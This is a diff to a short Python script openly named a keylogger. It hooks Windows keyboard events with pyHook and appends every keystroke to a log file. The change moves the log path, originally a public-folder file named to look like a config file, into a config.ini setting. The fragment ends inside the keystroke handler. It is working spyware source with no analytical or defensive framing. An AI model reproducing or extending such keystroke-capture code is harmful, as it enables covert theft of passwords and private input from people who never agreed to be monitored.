@@ -1,15 +1,22 @@
-# Python's Keylogger Circus
-# A simple keystroke recorder
-# v.1.2
+#		Python's Keylogger Circus
+# 	A simple keystroke recorder
+# 		- v.1.2
 
-import win32api
-import win32console
-import win32gui
+#		Windows-only Compatible
+# 	Requires PyHook: pyhook.sourceforge.net
 
 import pythoncom, pyHook
 
+#	Reads configuration file
+from ConfigParser import SafeConfigParser
+parser = SafeConfigParser()
+parser.read('config.ini')
+
+# Sets variable from config.ini
+dir = parser.get('Setup','directory')
+
 def OnKeyboardEvent(event):
-	f=open('c:\users\public\output.cfg','a')
+	f=open(dir,'a')
 	keylog=chr(event.Ascii)
 	if event.Ascii==13:
 		keylog='/n'
